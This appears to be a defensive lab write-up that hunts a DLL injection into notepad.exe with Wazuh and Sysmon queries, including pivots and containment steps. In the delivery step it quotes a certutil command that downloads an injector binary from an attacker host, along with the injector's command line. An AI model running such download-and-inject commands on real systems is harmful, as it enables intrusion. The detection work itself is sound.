# 05 — Investigation (hunter workflow)

## Step 1 — Hunt for the injection primitive

In Wazuh Discover, index `wazuh-archives-*` (time field `timestamp`, DQL):

```
data.win.system.eventID: 8
```

Filter to the lab window around `2026-11-13 12:40–13:00 UTC` (dashboard `20:40–21:00 PHT`). One event stands out: `eventRecordID 12279`, agent `winhome01`.

## Step 2 — Expand the event and read the triad

Expand the JSON. For EID 8, the decision triad is **SourceImage → TargetImage → StartFunction**:

- `SourceImage = C:\Users\Public\injector.exe` — unrecognized binary in a user-writable drop directory. **Suspicious.**
- `TargetImage = C:\Windows\System32\notepad.exe` — signed, benign Microsoft binary. **Legitimate target.**
- `StartFunction = LoadLibraryA` (StartModule `KERNEL32.DLL`) — the remote thread exists solely to load a DLL into the target. **Classic DLL injection.**

Combined: an unknown Public-folder EXE is forcing notepad.exe to load a DLL via a remote thread. → **Escalate as process injection (T1055.001).**

→ `evidence/wazuh-sysmon8-expanded.png`

## Step 3 — Pivot on the source process (PID 3128, ProcessGuid `{03477e4a-0775-6af7-5b14-000000000800}`)

Query for everything that ProcessGuid touched:

```
data.win.eventdata.processGuid: "{03477e4a-0775-6af7-5b14-000000000800}"
```

Expected (**not captured this run — list is what you would find**):
- Sysmon EID 1: `injector.exe` process creation, parent `powershell.exe` (or `cmd.exe`), command line `C:\Users\Public\injector.exe 2052 C:\Users\Public\inject.dll`, user `bryll`, `hashes` field (capture SHA256).
- Sysmon EID 10: `injector.exe` granted injection rights (`0x1F0FFF` / `0x143A`) to `notepad.exe` (PID 2052) — the `OpenProcess` call.
- Possibly Sysmon EID 11 if the injector wrote anything (it doesn't — it writes into the *remote* process, so no local file event).

## Step 4 — Pivot on the target process (PID 2052, ProcessGuid `{03477e4a-96ba-6af4-b112-000000000800}`)

```
data.win.eventdata.processGuid: "{03477e4a-96ba-6af4-b112-000000000800}" OR data.win.eventdata.targetProcessGuid: "{03477e4a-96ba-6af4-b112-000000000800}"
```

Expected (**not captured this run**):
- Sysmon EID 7: `notepad.exe` (PID 2052) loaded `C:\Users\Public\inject.dll`, `signed: false` — direct proof of the malicious module.
- Sysmon EID 1: original `notepad.exe` launch by `bryll` (benign — establishes the process was legitimate before injection).
- Any subsequent network connections (Sysmon EID 3) from `notepad.exe` — in a real incident this would be C2; in this lab, none (popup only).

## Step 5 — Pivot on delivery (LOLBin)

```
data.win.system.eventID: 1 AND data.win.eventdata.image: "*\\certutil.exe" AND data.win.eventdata.commandLine: "*urlcache*"
```

Expected (**not captured this run**): `certutil.exe -urlcache -split -f http://192.168.100.107/injector.exe C:\Users\Public\injector.exe`, plus a second fetch for `inject.dll`. Corroborate with Sysmon EID 3 (certutil → 192.168.100.107:80) and Sysmon EID 11 (file creation in `C:\Users\Public\`).

## Step 6 — Containment scoping

- **Scope:** single host (`winhome01`), single user (`bryll`), no lateral movement, no privilege escalation observed.
- **Actions:** delete `C:\Users\Public\injector.exe` + `inject.dll`; kill `notepad.exe` PID 2052 (injected memory is gone with it); reset `bryll` password as precaution; block `192.168.100.107` at egress (lab: it's the attacker).
- **Hunt wider:** run the EID 8 + EID 10 queries across all agents for the past 7 days to confirm no other host was targeted.

## What single event sufficed here

Even with only EID 8 captured, the SourceImage/TargetImage/StartFunction triad is independently conclusive: `C:\Users\Public\injector.exe` → remote thread in `notepad.exe` → `LoadLibraryA`. No legitimate administration uses this pattern. See `07-Analysis.md`.
